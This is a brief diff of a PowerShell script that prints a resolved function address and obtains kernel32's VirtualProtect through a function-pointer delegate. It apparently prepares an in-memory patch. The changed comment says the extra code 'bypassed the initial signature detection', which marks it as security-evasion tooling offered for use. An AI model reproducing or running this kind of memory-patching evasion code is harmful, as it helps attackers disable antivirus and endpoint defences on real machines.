@@ -54,7 +54,7 @@ $addr3 = '{0:X}' -f [Int64]$funcAddr3
 Write-Output "Addr3: 0x$addr3"
 
 
-#alot of this stuff was extra from when i was trying to find an alternative way to patch this but hey it worked
+#alot of this stuff was extra from when i was trying to find an alternative way to patch this but the extra stuff bypassed the initial signature detection lol
 
 
 $vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
